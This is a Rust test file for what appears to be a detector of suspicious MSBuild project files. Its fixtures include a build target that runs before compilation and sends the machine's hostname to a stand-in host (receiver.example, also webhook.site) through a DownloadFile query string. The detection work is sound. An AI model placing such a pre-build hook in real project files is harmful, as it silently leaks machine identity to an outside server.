use super::*;

fn matches(xml: &str) -> bool {
    let mut values = Values::new();
    extract(xml.as_bytes(), &mut values, &mut Errors::default());
    values
        .get("msbuild.downloads")
        .and_then(serde_json::Value::as_array)
        .is_some_and(|rows| rows.iter().any(|r| r["precompile_hostname_query"] == true))
}
const BODY: &str = r#"<Project><Target BeforeTargets="CoreCompile;Build"><PropertyGroup><Device>$([System.Environment]::MachineName)</Device><Endpoint>https://receiver.example/?id=$(Device)</Endpoint></PropertyGroup><DownloadFile SourceUrl="$(Endpoint)"/></Target></Project>"#;
#[test]
fn aliases_and_namespaces() {
    assert!(matches(BODY));
    assert!(matches(
        &BODY
            .replace("Device", "RENAMED")
            .replace("$(RENAMED)", "$(renamed)")
            .replace(
                "<Project>",
                "<Project xmlns='http://schemas.microsoft.com/developer/msbuild/2003'>"
            )
    ));
}
#[test]
fn inline_and_root_properties() {
    assert!(matches(
        r#"<Project><PropertyGroup><H>$([System.Environment]::MachineName)</H></PropertyGroup><Target BeforeTargets="Build"><DownloadFile SourceUrl="https://receiver.example/?host=$(H)"/></Target></Project>"#
    ));
}
#[test]
fn unknown_after_disclosed_value_is_not_before_it() {
    assert!(matches(
        &BODY.replace("?id=$(Device)", "?id=$(Device)&amp;pod=$(Unknown)")
    ));
    assert!(!matches(&BODY.replace(
        "?id=$(Device)",
        "?prefix=$(Unknown)&amp;id=$(Device)"
    )));
}
#[test]
fn ignores_comments_and_inert_xml() {
    assert!(!matches(&format!("<!-- {BODY} -->")));
    assert!(!matches(
        &BODY
            .replace("<Device>", "<!--<Device>")
            .replace("</Device>", "</Device>-->")
    ));
    assert!(!matches(&BODY.replace("Project", "Documentation")));
}
#[test]
fn requires_actual_download_and_hook() {
    assert!(!matches(&BODY.replace("DownloadFile", "Message")));
    assert!(!matches(&BODY.replace("CoreCompile;Build", "Manual")));
    assert!(!matches(
        &BODY.replace("$(Endpoint)", "https://receiver.example/static")
    ));
}
#[test]
fn excludes_path_fragment_and_opaque_inputs() {
    assert!(!matches(&BODY.replace("?id=", "path/")));
    assert!(!matches(&BODY.replace("?id=", "#?id=")));
    assert!(!matches(
        &BODY.replace("<Device>", "<Device Condition='unknown'>")
    ));
    assert!(!matches(&BODY.replace("$(Device)", "$(Unknown)")));
}
#[test]
fn target_scope_and_overwrites() {
    assert!(!matches(&BODY.replace(
        "<DownloadFile",
        "</Target><Target BeforeTargets='Manual'><DownloadFile"
    )));
    assert!(!matches(
        &BODY.replace("<Endpoint>", "<Device>constant</Device><Endpoint>")
    ));
    assert!(!matches(
        &BODY.replace("<Target ", "<Target Condition='false' ")
    ));
}
#[test]
fn flexible_phase_and_function_spacing() {
    assert!(matches(
        &BODY
            .replace("CoreCompile;Build", "corecompile;build")
            .replace(
                "[System.Environment]::MachineName",
                " [System.Environment] :: MachineName "
            )
            .replace("https://", "HTTPS://")
    ));
}
#[test]
fn destination_is_bound_to_the_callback() {
    let mut values = Values::new();
    extract(
        BODY.replace("receiver.example", "webhook.site").as_bytes(),
        &mut values,
        &mut Errors::default(),
    );
    assert_eq!(
        values
            .get("msbuild.downloads[0].precompile_hostname_query_authority")
            .and_then(serde_json::Value::as_str),
        Some("webhook.site")
    );
    extract(
        BODY.replace(
            "</Project>",
            "<PropertyGroup><Unused>https://webhook.site/</Unused></PropertyGroup></Project>",
        )
        .as_bytes(),
        &mut values,
        &mut Errors::default(),
    );
    assert_eq!(
        values
            .get("msbuild.downloads[0].precompile_hostname_query_authority")
            .and_then(serde_json::Value::as_str),
        Some("receiver.example")
    );
}
#[test]
fn truncated_property_groups_do_not_preserve_stale_inputs() {
    let mut map = Properties::new();
    map.insert("device".to_owned(), vec![Part::Hostname]);
    let xml = format!(
        "<PropertyGroup>{}<Device>constant</Device></PropertyGroup>",
        "<Padding>x</Padding>".repeat(128)
    );
    let doc = roxmltree::Document::parse(&xml).unwrap();
    properties(doc.root_element(), &mut map);
    assert!(matches!(
        expand("$(Device)", &map).get(1),
        Some(Part::Unknown)
    ));
}

#[test]
fn root_is_read_from_the_prolog() {
    assert!(root_is_project("<Project Sdk=\"x\">"));
    assert!(root_is_project(
        "<?xml version=\"1.0\"?>\n<!-- build -->\n<!DOCTYPE p>\n<msb:Project xmlns:msb=\"u\"/>"
    ));
    assert!(!root_is_project("<?xml version=\"1.0\"?><Projects/>"));
    assert!(!root_is_project("<html><Project/></html>"));
    assert!(!root_is_project("<!-- never closed <Project>"));
    assert!(!root_is_project("text"));
}

fn tree(xml: &str) -> serde_json::Value {
    let mut values = Values::new();
    let mut errors = Errors::default();
    extract(xml.as_bytes(), &mut values, &mut errors);
    assert_eq!(errors, Errors::default());
    values.into_json()
}

#[test]
fn element_tree_addresses_an_inline_task() {
    let doc = tree(
        r#"<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- a comment is not text -->
  <UsingTask TaskName="T" TaskFactory="CodeTaskFactory">
    <Task><Code Type="Fragment" Language="cs"><![CDATA[ Console.WriteLine(1); ]]></Code></Task>
  </UsingTask>
  <Target Name="A"><Exec Command="one"/></Target>
  <Target Name="B"><Exec Command="two"/><Exec Command="three"/></Target>
  <PropertyGroup><Plain>value</Plain></PropertyGroup>
</Project>"#,
    );
    let project = &doc["Project"];
    assert_eq!(project["@ToolsVersion"], "4.0");
    assert_eq!(
        project["@xmlns"],
        "http://schemas.microsoft.com/developer/msbuild/2003"
    );
    assert_eq!(project["UsingTask"]["@TaskFactory"], "CodeTaskFactory");
    assert_eq!(project["UsingTask"]["Task"]["Code"]["@Language"], "cs");
    assert_eq!(
        project["UsingTask"]["Task"]["Code"]["_text"],
        "Console.WriteLine(1);"
    );
    // A shared namespace is declared once, not inherited into children.
    assert!(project["UsingTask"].get("@xmlns").is_none());
    // Repeated siblings become an array in document order.
    assert_eq!(project["Target"][0]["Exec"]["@Command"], "one");
    assert_eq!(project["Target"][1]["Exec"][1]["@Command"], "three");
    // Text alone is the element's value.
    assert_eq!(project["PropertyGroup"]["Plain"], "value");
}

#[test]
fn element_tree_is_depth_capped() {
    let depth = 2 * MAX_TREE_DEPTH;
    let xml = format!(
        "<Project>{}{}</Project>",
        "<g>".repeat(depth),
        "</g>".repeat(depth)
    );
    let doc = tree(&xml);
    let mut node = &doc["Project"];
    let mut levels = 0;
    while let Some(child) = node.get("g") {
        node = child;
        levels += 1;
    }
    assert_eq!(levels, MAX_TREE_DEPTH);
    assert!(node.is_null());
}

#[test]
fn element_tree_only_for_projects() {
    assert_eq!(tree("<configuration><a/></configuration>"), tree(""));
}
